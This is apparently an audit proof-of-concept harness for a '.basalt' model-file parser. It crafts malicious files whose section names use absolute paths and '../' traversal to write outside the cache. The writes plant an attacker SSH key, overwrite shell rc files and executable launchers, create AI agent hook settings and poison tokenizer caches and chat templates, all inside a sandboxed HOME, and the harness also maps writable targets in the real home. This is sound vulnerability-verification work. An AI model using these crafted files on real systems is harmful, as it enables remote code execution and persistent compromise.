#!/usr/bin/env bash
# Plan 02 T3 — proof-of-concept harness for the .basalt model-file parser findings.
#
# Every finding in context/audit/findings.md is asserted here by execution, against
# vendor/basalt's own parser (tools/model_file.py) and its own server-side consumer
# (serve/engine/modelfile.py). Nothing in vendor/ is modified; nothing is written outside
# the throwaway tree under $TMPDIR.
#
# SAFETY GUARD: several probes write files by absolute path, which is the point of the
# exercise. The script therefore OVERWRITES $HOME with a throwaway directory of its own
# before probing anything, so no probe can reach the real home. The real home is used in
# one place only - measuring the byte length of a target path, which writes nothing. Run
# it as-is:
#
#   context/audit/scripts/t3-model-file-poc.sh
#
# It prints one `NAME=value` verdict per probe and exits non-zero if any expected
# behaviour fails to reproduce. An empty result is not a pass.
set -uo pipefail
export LC_ALL=C

REPO=${REPO:-$(cd "$(dirname "$0")/../../.." && pwd)}
VENDOR="$REPO/vendor/basalt"
[ -f "$VENDOR/tools/model_file.py" ] || { echo "POC_ABORT=vendor tree not found at $VENDOR"; exit 2; }

REAL_HOME=$HOME
BASE=${POC_BASE:-$(mktemp -d "${TMPDIR:-/tmp}/basalt-poc.XXXXXX")}
export HOME="$BASE/home"
mkdir -p "$HOME/.ssh"          # a realistic dev box has ~/.ssh; write_bytes cannot mkdir
export PYTHONPATH="$VENDOR"
# MANDATORY. This harness runs with cwd inside the audited tree and imports its modules, and CPython
# writes __pycache__/*.pyc next to the source it imported. That contaminated the vendored tree with
# 13 bytecode files during this audit, and `git diff dc047a7` did NOT see them because server/basalt/
# .gitignore line 1 is /vendor/ — the freeze check is blind to anything untracked in there. The census
# universe sentinel caught it (875 files against a pinned 862). Never import the audited tree without
# this set.
export PYTHONDONTWRITEBYTECODE=1
cd "$VENDOR" || exit 2


python3 - "$BASE" <<'PY'
"""Every probe. Prints NAME=value; raises nothing that the caller cannot see."""
import sys, os, json, hashlib, struct, shutil, stat, inspect
from pathlib import Path

BASE = sys.argv[1]
sys.path.insert(0, "tools")
from model_file import (HEADER, ENTRY, MAGIC, VERSION, HEADER_BYTES,
                        MAX_SECTIONS, ModelFile, ModelWriter)
import serve.engine.modelfile as M

CAUGHT = (OSError, ValueError, KeyError)          # serve/server.py:129
V = {}


def craft(path, body, n=None, meta_digest=None):
    """Hand-build a .basalt header, bypassing every ModelWriter check."""
    blob = bytearray(b"\0" * HEADER_BYTES)
    ents = []
    for i, (nm, d) in enumerate(body):
        off = HEADER_BYTES + i * (1 << 20)
        while len(blob) < off:
            blob.append(0)
        blob[off:off + len(d)] = d
        ents.append((nm, off, len(d),
                     meta_digest if (meta_digest and nm == b"meta") else hashlib.sha256(d).digest()))
    HEADER.pack_into(blob, 0, MAGIC, VERSION, n if n is not None else len(ents), len(blob), b"\0" * 40)
    for i, (nm, off, sz, dg) in enumerate(ents):
        ENTRY.pack_into(blob, HEADER.size + i * ENTRY.size, nm, off, sz, dg, b"\0" * 16)
    Path(path).write_bytes(bytes(blob))
    return path


def raised(fn):
    """The exception a call raises, or 'none'."""
    try:
        fn()
        return "none"
    except BaseException as e:                    # noqa: BLE001 - the type IS the result
        return type(e).__name__


def clean(fn):
    """Does server.py:129 turn this into a one-line reject?"""
    try:
        fn()
        return "accepted"
    except BaseException as e:                    # noqa: BLE001
        return "clean" if isinstance(e, CAUGHT) else "TRACEBACK"


# ---------------------------------------------------------------- F-1 write primitive
# The primitive: name.split("/",1)[1] of "tokenizer//abs/path" is absolute, and
# Path(x) / "/abs" discards x entirely. No ".." anywhere.
out = Path(BASE) / "OUTSIDE-HOME"
p = craft(f"{BASE}/f1.basalt", [(b"meta", b'{"name":"F1"}'),
                                (b"tokenizer/vocab.json", b"{}"),
                                (b"tokenizer/" + str(out).encode(), b"F1 WRITE PRIMITIVE\n")])
M.extract_tokenizer(ModelFile(p))
V["F1_ABSOLUTE_JOIN_WRITE"] = "wrote" if out.exists() else "no"

# and the classic traversal form
trav = Path(BASE) / "home/.bashrc"
p = craft(f"{BASE}/f1b.basalt", [(b"meta", b'{"name":"F1B"}'),
                                 (b"tokenizer/vocab.json", b"{}"),
                                 (b"tokenizer/../../../../.bashrc", b"F1 TRUNCATED MY SHELL RC\n")])
M.extract_tokenizer(ModelFile(p))
V["F1_TRAVERSAL_WRITE"] = "wrote" if trav.exists() else "no"

# the RCE payload, executed for real (into the sandbox HOME, never the real one). The
# relative form is used deliberately: its length does not depend on where the sandbox is,
# whereas the absolute form costs one byte per path byte (see the BUDGET lines below).
ak = Path(BASE) / "home/.ssh/authorized_keys"
p = craft(f"{BASE}/f1c.basalt", [(b"meta", b'{"name":"F1C"}'), (b"tokenizer/vocab.json", b"{}"),
                                 (b"tokenizer/../../../../.ssh/authorized_keys", b"ssh-ed25519 AAAAPLANTED attacker@poc.invalid\n")])
M.extract_tokenizer(ModelFile(p))
V["F1_AUTHORIZED_KEYS_WRITE"] = "wrote" if ak.exists() else "no"

# root cause: the reader accepts a name the writer refuses
name64 = b"tokenizer/" + b"X" * (64 - 10)
V["F1_WRITER_REJECTS_64"] = raised(lambda: ModelWriter(f"{BASE}/x.basalt").add_bytes(name64.decode(), b"x"))
p64 = craft(f"{BASE}/f1d.basalt", [(b"meta", b"{}"), (b"tokenizer/vocab.json", b"{}"), (name64, b"x")])
V["F1_READER_ACCEPTS_64"] = "yes" if any(n.startswith("tokenizer/X") for n in ModelFile(p64).names()) else "no"

# no shell, no injection anywhere on this path: cache_dir is hex by construction
V["F1_CACHE_DIR_IS_HEX"] = "hex" if all(c in "0123456789abcdef" for c in M.cache_dir(ModelFile(p64)).name) else "NOT-HEX"

# open(p,"wb") truncates the EXISTING inode: it neither replaces it nor changes its mode, so a
# write onto an executable launcher leaves it executable. This is why the `run` leg is code exec.
exe = Path(BASE) / "exe"; exe.write_bytes(b"#!/usr/bin/env bash\necho original\n"); exe.chmod(0o755)
before = (exe.stat().st_mode, exe.stat().st_ino)
with open(exe, "wb") as f:
    f.write(b"#!/usr/bin/env bash\necho planted\n")
after = (exe.stat().st_mode, exe.stat().st_ino)
V["F1_TRUNCATE_PRESERVES_MODE_AND_INODE"] = (
    "yes" if before[0] == after[0] and before[1] == after[1] and os.access(exe, os.X_OK) else "no")

# The write target does NOT have to exist: any new file in any existing directory is writable.
# Agent hook config is the worst instance measured - a brand-new settings.json, 51-byte relative
# name, nothing overwritten, and (on this host) invisible to git because ~/.gitignore:16 /.claude
hookdir = Path(BASE) / "repo/.claude"; hookdir.mkdir(parents=True, exist_ok=True)
rel = "../../../../../repo/.claude/settings.json"        # 5 ups from <hex>/tokenizer.X -> BASE
V["F1_NEWFILE_HOOKCFG_NAME_BYTES"] = len("tokenizer/" + rel)
p = craft(f"{BASE}/hook.basalt", [(b"meta", b'{"name":"HOOK"}'), (b"tokenizer/vocab.json", b"{}"),
                                  (b"tokenizer/" + rel.encode(), b'{"hooks":{"PreToolUse":[]}}\n')])
M.extract_tokenizer(ModelFile(p))
V["F1_NEW_FILE_IN_EXISTING_DIR"] = "wrote" if (hookdir / "settings.json").exists() else "no"

# open() follows symlinked path COMPONENTS, not only a link at the final component. `models` is a
# symlink to a shared store on this host, so a relative name walks out of the cache and into it.
store = Path(BASE) / "shared-store"; proj = Path(BASE) / "proj/server/basalt"
store.mkdir(parents=True, exist_ok=True); proj.mkdir(parents=True, exist_ok=True)
(proj / "models").is_symlink() or (proj / "models").symlink_to(store)
rel = "../../../../../proj/server/basalt/models/evil.pth"      # 5 ups from tokenizer.X -> BASE
p = craft(f"{BASE}/sym.basalt", [(b"meta", b'{"name":"SYM"}'), (b"tokenizer/vocab.json", b"{}"),
                                 (b"tokenizer/" + rel.encode(), b"PLANTED IN THE MODEL STORE\n")])
M.extract_tokenizer(ModelFile(p))
V["F1_SYMLINKED_COMPONENT_WRITE"] = (
    "wrote" if (store / "evil.pth").exists()
    and (store / "evil.pth").read_bytes() == b"PLANTED IN THE MODEL STORE\n" else "no")

# THE END-TO-END LEG. Every probe above either proves a JOIN/TRAVERSAL shape or proves truncate
# semantics with a bare open(); neither is the shipped call. This one drives the real
# extract_tokenizer() at a PRE-EXISTING, mode-0755, shebang-bearing file and then re-reads mode and
# inode, which is what the "`run` survives the overwrite executable" claim actually needs. A fix that
# switched the sink to mkstemp + os.replace would flip the inode and turn this red.
exe = Path(BASE) / "launcher"
exe.write_bytes(b"#!/usr/bin/env bash\necho ORIGINAL\n"); exe.chmod(0o755)
before = (exe.stat().st_mode, exe.stat().st_ino)
rel = "../../../../../launcher"                       # 5 ups from tokenizer.X -> BASE
V["F1_EXISTING_EXEC_NAME_BYTES"] = len("tokenizer/" + rel)
p = craft(f"{BASE}/exec.basalt", [(b"meta", b'{"name":"EXEC"}'), (b"tokenizer/vocab.json", b"{}"),
                                  (b"tokenizer/" + rel.encode(), b"#!/usr/bin/env bash\necho PLANTED\n")])
M.extract_tokenizer(ModelFile(p))
after = (exe.stat().st_mode, exe.stat().st_ino)
V["F1_REAL_PATH_OVERWRITES_MODE755_IN_PLACE"] = (
    "preserved" if before[0] == after[0] and before[1] == after[1]
    and exe.read_bytes() == b"#!/usr/bin/env bash\necho PLANTED\n"
    and os.access(exe, os.X_OK) and stat.S_IMODE(after[0]) == 0o755 else "no")

# The other sink in the same file behaves DIFFERENTLY, and the difference matters: write_section()
# uses mkstemp + os.replace, so it REPLACES the inode and a pre-existing mode does not survive it.
# Keeping the two paths separate is what stops "the tokenizer path preserves mode" being read as
# "every write in this module preserves mode".
V["F2_WRITETYPE_PATH_IS_ATOMIC_REPLACE"] = (
    "yes" if "os.replace" in inspect.getsource(M.write_section) else "no")

# ---------------------------------------------------------------- F-2 cache identity
good = craft(f"{BASE}/good.basalt", [(b"meta", json.dumps({"name": "Good Pack"}).encode()),
                                     (b"tokenizer/vocab.json", b'{"REAL":1}'),
                                     (b"tokenizer/merges.txt", b"m")])
gc = M.cache_dir(ModelFile(good)); gc.mkdir(parents=True, exist_ok=True)
M.extract_tokenizer(ModelFile(good))
rel = f"../../{gc.name}/tokenizer/vocab.json"           # sibling: 16 hex are readable off any copy
p = craft(f"{BASE}/sib.basalt", [(b"meta", b'{"name":"SIB"}'), (b"tokenizer/vocab.json", b"{}"),
                                 (b"tokenizer/" + rel.encode(), b'{"POISONED":1}')])
V["F2_SIBLING_NAME_BYTES"] = len("tokenizer/" + rel)
M.extract_tokenizer(ModelFile(p))
V["F2_SIBLING_CACHE_POISON"] = ("poisoned"
                                if (gc / "tokenizer/vocab.json").read_bytes() == b'{"POISONED":1}' else "no")

# the declared-digest collision, and everything else keyed off the same directory
legit_meta = json.dumps({"name": "Real Pack"}).encode()
lp = craft(f"{BASE}/legit.basalt", [(b"meta", legit_meta), (b"tokenizer/vocab.json", b"{}"), (b"tokenizer/merges.txt", b"{}")])
ep = craft(f"{BASE}/evil.basalt", [(b"meta", legit_meta), (b"tokenizer/vocab.json", b'{"EVIL":1}'), (b"tokenizer/merges.txt", b"{}")],
           meta_digest=hashlib.sha256(legit_meta).digest())
words = ["--conversation-cache-disk-mib", "100"]        # the conv dir only appears when budget > 0
lc = M.model_config(lp, "/bin/true", engine_words=words)
ec = M.model_config(ep, "/bin/true", engine_words=words)
import re
cd = lambda c: (re.search(r"--conversation-cache-dir (\S+)", " ".join(c["args"])) or [None, None])[1]
V["F2_SHARED_TOKENIZER_DIR"] = "yes" if lc["tokenizer"] == ec["tokenizer"] else "no"
V["F2_SHARED_ENGINE_LOG"] = "yes" if lc["log"] == ec["log"] else "no"
V["F2_SHARED_CONVERSATION_CACHE"] = "yes" if (cd(lc) and cd(lc) == cd(ec)) else "no"

# first writer wins: boot order decides, and the poison outlives the file
def boot_order(first, second):
    shutil.rmtree(M.cache_root(), ignore_errors=True)
    M.extract_tokenizer(ModelFile(first)); M.extract_tokenizer(ModelFile(second))
    return (Path(lc["tokenizer"]) / "vocab.json").read_bytes()
V["F2_EVIL_BOOTED_FIRST"] = "poisoned" if boot_order(ep, lp) == b'{"EVIL":1}' else "no"
V["F2_REAL_BOOTED_FIRST"] = "poisoned" if boot_order(lp, ep) == b'{"EVIL":1}' else "no"

# The same short-circuit is a TRAP IN THIS HARNESS: two probes whose `meta` bytes are identical
# resolve to one cache dir, so the second extract_tokenizer() returns early having written nothing
# while the caller sees no exception and scores it a pass. Every probe below therefore carries a
# unique meta, and this assertion proves the short-circuit is live rather than assumed.
dupdir = M.cache_root()
shutil.rmtree(dupdir, ignore_errors=True)
same = [(b"meta", b'{"name":"SAME"}'), (b"tokenizer/vocab.json", b'{"A":1}')]
first = craft(f"{BASE}/sc1.basalt", same + [(b"tokenizer/../../../../../SC-PROBE", b"first\n")])
M.extract_tokenizer(ModelFile(first))
(Path(BASE) / "SC-PROBE").unlink(missing_ok=True)
second = craft(f"{BASE}/sc2.basalt", same + [(b"tokenizer/../../../../../SC-PROBE", b"second\n")])
M.extract_tokenizer(ModelFile(second))          # identical meta -> early return, writes nothing
V["F2_SAME_META_SHORTCIRCUITS_EXTRACTION"] = (
    "short-circuited" if not (Path(BASE) / "SC-PROBE").exists() else "re-extracted")

# the consumer: server.py:165 sets a.tokenizer = cfg["tokenizer"], :222 renders its template
tpl = "{%- set _ = [] %}INJECTED {{ messages[0].content }}"
p = craft(f"{BASE}/tpl.basalt", [(b"meta", json.dumps({"name": "TplPack"}).encode()),
                                 (b"tokenizer/vocab.json", b'{"<|im_start|>":0}'),
                                 (b"tokenizer/merges.txt", b"EVIL MERGES\n"),
                                 (b"tokenizer/chat_template.jinja", tpl.encode())])
cfg = M.model_config(p, "/bin/true")
tp = Path(cfg["tokenizer"])
V["F2_PACK_CHAT_TEMPLATE_AT_TPATH"] = "yes" if (tp / "chat_template.jinja").exists() else "no"
V["F2_PACK_VOCAB_AT_TPATH"] = "yes" if (tp / "vocab.json").exists() else "no"
V["F2_MODEL_NAME_FROM_PACK"] = str(cfg["model_name"])

# ---------------------------------------------------------------- F-3 resource
sp = craft(f"{BASE}/oom.basalt", [(b"meta", b'{"name":"S"}'), (b"tokenizer/vocab.json", b'{"GOOD":"data"}')])
with open(sp, "r+b") as f:                            # ENTRY: 64s name, Q off @ +64, Q size @ +72
    f.seek(HEADER.size + ENTRY.size + 72); f.write(struct.pack("<Q", 1 << 30))
V["F3_REAL_BYTES"] = os.path.getsize(sp)
V["F3_DECLARED_SIZE"] = 1 << 30
V["F3_SHORT_READ_RAISES"] = raised(lambda: ModelFile(sp).read("tokenizer/vocab.json"))

if os.environ.get("POC_SPARSE") == "1":               # opt-in: it writes 256 MiB of real disk
    q = f"{BASE}/sparse.basalt"
    N = 256 << 20; mm = HEADER_BYTES; tk = HEADER_BYTES + (1 << 20); mo = HEADER_BYTES + (2 << 20)
    meta = b'{"name":"SP"}'
    blob = bytearray(b"\0" * HEADER_BYTES)
    HEADER.pack_into(blob, 0, MAGIC, VERSION, 3, mo + len(meta), b"\0" * 40)
    ENTRY.pack_into(blob, HEADER.size, b"meta", mo, len(meta), hashlib.sha256(meta).digest(), b"\0" * 16)
    ENTRY.pack_into(blob, HEADER.size + 128, b"vision/mmproj", mm, N, hashlib.sha256(b"").digest(), b"\0" * 16)
    ENTRY.pack_into(blob, HEADER.size + 256, b"tokenizer/vocab.json", tk, 2, hashlib.sha256(b"{}").digest(), b"\0" * 16)
    Path(q).write_bytes(bytes(blob))
    with open(q, "r+b") as f:
        f.seek(mm); f.write(b"M" * 4096)
        f.seek(tk); f.write(b"{}")
        f.seek(mo); f.write(meta)
        f.truncate(mm + N)                            # sparse: apparent 256 MiB, allocated ~76 KiB
    mf = ModelFile(q)
    dest = M.cache_dir(mf) / "vision" / "mmproj.gguf"
    try:
        M.write_section(mf, "vision/mmproj", dest)
        V["F3_SPARSE_OUTPUT_ALLOCATED_MIB"] = os.stat(dest).st_blocks * 512 >> 20
    except BaseException as e:                        # noqa: BLE001
        V["F3_SPARSE_OUTPUT_ALLOCATED_MIB"] = type(e).__name__
    V["F3_SPARSE_INPUT_ALLOCATED_KIB"] = os.stat(q).st_blocks * 512 >> 10

# ---------------------------------------------------------------- F-4 clean rejection
def eight():
    Path(f"{BASE}/t8.basalt").write_bytes(b"BASALTMF")
    return ModelFile(f"{BASE}/t8.basalt")
V["F4_EIGHT_BYTE_FILE"] = clean(eight)
V["F4_N_512_SECTIONS"] = clean(lambda: ModelFile(craft(f"{BASE}/n512.basalt", [(b"meta", b"{}"), (b"tokenizer/vocab.json", b"{}")], n=512)))
V["F4_META_NOT_AN_OBJECT"] = clean(lambda: M.model_config(craft(f"{BASE}/arr.basalt", [(b"meta", b"[1,2]"), (b"tokenizer/vocab.json", b"{}")]), "/bin/true"))
V["F4_STRUCT_ERROR_IN_TUPLE"] = "yes" if issubclass(struct.error, CAUGHT) else "no"
# the edges the code DOES get right
V["OK_NONUTF8_NAME"] = clean(lambda: ModelFile(craft(f"{BASE}/u.basalt", [(b"meta", b"{}"), (b"tokenizer/\xff\xfe", b"x"), (b"tokenizer/vocab.json", b"{}")])))
def nul():
    m = ModelFile(craft(f"{BASE}/nul.basalt", [(b"meta", b"{}"), (b"tokenizer/vocab.json", b"{}"), (b"tokenizer/a\x00b", b"x")]))
    return M.extract_tokenizer(m)
V["OK_EMBEDDED_NUL"] = clean(nul)
def empty_seg():
    m = ModelFile(craft(f"{BASE}/emp.basalt", [(b"meta", b"{}"), (b"tokenizer/vocab.json", b"{}"), (b"tokenizer/", b"x")]))
    return M.extract_tokenizer(m)
V["OK_EMPTY_AFTER_PREFIX"] = clean(empty_seg)
def trunc():
    q = craft(f"{BASE}/tr.basalt", [(b"meta", b"{}"), (b"tokenizer/vocab.json", b"{}")])
    with open(q, "r+b") as f:
        f.truncate(3000)
    return ModelFile(q)
V["OK_TRUNCATED_DOWNLOAD"] = clean(trunc)

# ---------------------------------------------------------------- refuted claims
# os.replace does NOT follow a symlink at dest (rename(2) replaces the link), so the
# "second write primitive" hypothesis is false. Recorded so nobody re-reports it.
wp = craft(f"{BASE}/link.basalt", [(b"meta", b'{"name":"L"}'), (b"vision/mmproj", b"VIA-REPLACE\n"), (b"tokenizer/vocab.json", b"{}")])
m = ModelFile(wp); cdir = M.cache_dir(m); (cdir / "vision").mkdir(parents=True, exist_ok=True)
victim = Path(BASE) / "VICTIM"; link = cdir / "vision" / "mmproj.gguf"
if link.is_symlink() or link.exists():
    link.unlink()
victim.write_bytes(b"ORIGINAL\n")
link.symlink_to(victim)
try:
    M.write_section(m, "vision/mmproj", link)
except BaseException:                                 # noqa: BLE001
    pass
V["REFUTED_OS_REPLACE_FOLLOWS_SYMLINK"] = "followed" if victim.read_bytes() == b"VIA-REPLACE\n" else "not-followed"

# zero-length section: a well-formed pack that needs no crafted header at all
zp = f"{BASE}/zero.basalt"
w = ModelWriter(zp); w.add_bytes("meta", json.dumps({"name": "Z"}).encode()); w.add_bytes("tokenizer/vocab.json", b""); w.close()
zv = M.extract_tokenizer(ModelFile(zp)) / "vocab.json"
V["OK_ZERO_LENGTH_VOCAB_PASSES_GATE"] = "yes" if (zv.exists() and zv.stat().st_size == 0) else "no"

# duplicate after rstrip: last one wins, silently
dp = craft(f"{BASE}/dup.basalt", [(b"meta", b'{"name":"D"}'), (b"tokenizer/vocab.json", b'{"FIRST":1}'), (b"tokenizer/vocab.json\x00", b'{"SECOND":1}')])
dm = ModelFile(dp)
M.extract_tokenizer(dm)
V["OK_DUPLICATE_LAST_WINS"] = (M.cache_dir(dm) / "tokenizer/vocab.json").read_bytes().decode()

# ---------------------------------------------------- assertions (an empty result is not a pass)
EXPECTED = {
    # F-1: the write primitive fires, and the root cause is a reader that trusts the writer
    "F1_ABSOLUTE_JOIN_WRITE": "wrote", "F1_TRAVERSAL_WRITE": "wrote",
    "F1_AUTHORIZED_KEYS_WRITE": "wrote", "F1_WRITER_REJECTS_64": "ValueError",
    "F1_READER_ACCEPTS_64": "yes", "F1_CACHE_DIR_IS_HEX": "hex",
    "F1_TRUNCATE_PRESERVES_MODE_AND_INODE": "yes",
    "F1_NEW_FILE_IN_EXISTING_DIR": "wrote", "F1_SYMLINKED_COMPONENT_WRITE": "wrote",
    "F1_REAL_PATH_OVERWRITES_MODE755_IN_PLACE": "preserved",
    "F2_WRITETYPE_PATH_IS_ATOMIC_REPLACE": "yes",
    # F-2: cache identity is declared, not derived
    "F2_SIBLING_CACHE_POISON": "poisoned", "F2_SHARED_TOKENIZER_DIR": "yes",
    "F2_SHARED_ENGINE_LOG": "yes", "F2_SHARED_CONVERSATION_CACHE": "yes",
    "F2_EVIL_BOOTED_FIRST": "poisoned", "F2_REAL_BOOTED_FIRST": "no",   # the negative control
    "F2_SAME_META_SHORTCIRCUITS_EXTRACTION": "short-circuited",
    "F2_PACK_CHAT_TEMPLATE_AT_TPATH": "yes", "F2_PACK_VOCAB_AT_TPATH": "yes",
    # F-3: declared size is never bounded against the real file
    "F3_SHORT_READ_RAISES": "none",
    # F-4: three rejections that escape server.py:129
    "F4_EIGHT_BYTE_FILE": "TRACEBACK", "F4_N_512_SECTIONS": "TRACEBACK",
    "F4_META_NOT_AN_OBJECT": "TRACEBACK", "F4_STRUCT_ERROR_IN_TUPLE": "no",
    # the edges the code already gets right - a firing control must stay clean
    "OK_NONUTF8_NAME": "clean", "OK_EMBEDDED_NUL": "clean",
    "OK_EMPTY_AFTER_PREFIX": "clean", "OK_TRUNCATED_DOWNLOAD": "clean",
    "OK_ZERO_LENGTH_VOCAB_PASSES_GATE": "yes", "OK_DUPLICATE_LAST_WINS": '{"SECOND":1}',
    # a hypothesis that turned out to be false; assert it stays false
    "REFUTED_OS_REPLACE_FOLLOWS_SYMLINK": "not-followed",
}
bad = 0
for k in sorted(EXPECTED):
    got = V.get(k, "<unset>")
    if got == EXPECTED[k]:
        print(f"ASSERT {k:38s} == {EXPECTED[k]!r:22s} ok")
    else:
        print(f"ASSERT {k:38s} == {EXPECTED[k]!r:22s} FAIL got {got!r}"); bad += 1
for k in sorted(V):
    print(f"POC {k}={V[k]}")
if bad:
    print(f"POC_ASSERT_FAILURES={bad}")
    sys.exit(1)
PY
rc=$?

# THE AUDITED TREE MUST BE EXACTLY AS FOUND — and `git diff` is not the check. server/basalt/.gitignore
# line 1 is /vendor/, so anything a probe leaves inside vendor/basalt is untracked AND ignored: 13
# __pycache__ files sat in the audited tree through a whole session of "AUDIT TREE OK" lines and were
# caught only by the census universe hash (875 files against a pinned 862). Count the files; do not
# ask git. Bytecode is the specific mechanism this harness can trip, so it is named, not folded into
# a count. An exit 3 here means the experiment damaged its own subject.
if [ -d "$VENDOR" ]; then
  npyc=$(find "$VENDOR" -name '*.pyc' -o -name '__pycache__' | wc -l)
  echo "POC_TREE_FILES=$(find "$VENDOR" -type f ! -path "$VENDOR/.git/*" | wc -l) POC_TREE_BYTECODE=$npyc"
  [ "$npyc" -eq 0 ] || { echo "POC_ABORT=python bytecode left inside the audited tree"; exit 3; }
fi

# Byte budget for absolute targets: the ENTRY name field is 64 bytes, prefix costs 10.
# Measured against the REAL home, which is what an attacker would target. This loop only
# takes string lengths and stats existing paths - it never opens, creates or writes any of them.
#
# Three columns, because the byte count is not reachability and reachability is not severity:
#   budget   does tokenizer/<abspath> fit the 64-byte name field
#   parent   does the parent directory exist (write_bytes cannot mkdir)
#   state    file / symlink(+target) / absent. ABSENT IS STILL WRITABLE when the parent exists:
#            open(p,"wb") does not require p to exist, so new files are in scope too.
echo "POC_BUDGET_PREFIX_BYTES=10"
reachable() { # reachable <abspath>
  local t=$1 n=$(( 10 + ${#1} )) st pd
  if [ -d "$(dirname "$t")" ]; then pd="parent-ok"; else pd="NO-PARENT"; fi
  if [ -L "$t" ]; then st="symlink->$(readlink "$t")"
  elif [ -f "$t" ]; then st="file($(stat -c%s "$t")B,mode$(stat -c%a "$t"))"
  else st="absent(new-file)"; fi
  printf 'POC_REACH %-4s %-10s %-28s %s\n' "$n/64" "$pd" "$st" "${t/#$REAL_HOME/\$HOME}"
}
for t in "$REAL_HOME/.gitconfig" "$REAL_HOME/.bashrc" "$REAL_HOME/.profile" \
         "$REAL_HOME/.bash_aliases" "$REAL_HOME/.ssh/authorized_keys" "$REAL_HOME/.ssh/config" \
         "$REAL_HOME/.config/systemd/user/x.service" "$REAL_HOME/.config/autostart/x.desktop" \
         "$REAL_HOME/.claude/settings.json" \
         "$REAL_HOME/prog/ai/local-mind/.claude/settings.json" \
         "$REAL_HOME/prog/ai/local-mind/server/basalt/run" \
         "$REAL_HOME/prog/ai/local-mind/server/basalt/build" \
         "$REAL_HOME/prog/ai/local-mind/server/basalt/AGENTS.md" \
         "$REAL_HOME/prog/ai/local-mind/server/basalt/README.md" \
         "$REAL_HOME/prog/ai/local-mind/server/basalt/context/plans/RULES.md" \
         "$REAL_HOME/prog/ai/local-mind/bin/opencode" \
         "$REAL_HOME/prog/ai/local-mind/bin/model-switcher"; do
  reachable "$t"
done

# Are the interesting ones tracked by git? A tracked target is a whole-file diff at the next
# commit; an ignored one is invisible. `git check-ignore` first, because an ignored file is
# invisible even when it would otherwise show as untracked.
#
# These git calls MUST run with the operator's real HOME restored: core.excludesFile is
# `~/.gitignore`, and this harness has already pointed HOME at a sandbox, so with the sandbox
# HOME git cannot see the global ignore file and reports a genuinely-ignored path as untracked.
# Measured: `.claude/settings.json` is IGNORED with the real HOME and "untracked" with the
# sandbox one. Same command, different answer, because the environment moved.
git_tracked() { # git_tracked <abspath>
  local t=$1 repo
  repo=$(cd "$(dirname "$t")" 2>/dev/null && HOME="$REAL_HOME" git rev-parse --show-toplevel 2>/dev/null) || { echo "POC_TRACK norepo $t"; return; }
  if (cd "$repo" && HOME="$REAL_HOME" git check-ignore -q "$t" 2>/dev/null); then
    echo "POC_TRACK IGNORED $(cd "$repo" && HOME="$REAL_HOME" git check-ignore -v "$t" | awk '{print $1}' FS=':') $t"
  elif (cd "$repo" && HOME="$REAL_HOME" git --no-optional-locks ls-files --error-unmatch "$t") >/dev/null 2>&1; then
    echo "POC_TRACK tracked $t"
  else
    echo "POC_TRACK untracked $t"
  fi
}
for t in "$REAL_HOME/prog/ai/local-mind/server/basalt/run" \
         "$REAL_HOME/prog/ai/local-mind/server/basalt/build" \
         "$REAL_HOME/prog/ai/local-mind/.claude/settings.json" \
         "$REAL_HOME/prog/ai/local-mind/bin/opencode" \
         "$REAL_HOME/dotfiles/.gitconfig"; do
  git_tracked "$t"
done

# A symlinked directory component is an escape into wherever it points: `models` on this host is
# a symlink to a shared store, and open() follows components, not just a link at the last element.
for d in "$REAL_HOME/prog/ai/local-mind/models" "$REAL_HOME/prog/ai/local-mind/server/basalt/models"; do
  if [ -L "$d" ]; then echo "POC_COMPONENT_SYMLINK $d -> $(readlink "$d")"
  elif [ -d "$d" ]; then echo "POC_COMPONENT_DIR     $d"; fi
done

[ $rc -eq 0 ] || { echo "POC_RC=$rc"; exit 1; }
echo "POC_VERDICT=PASS"
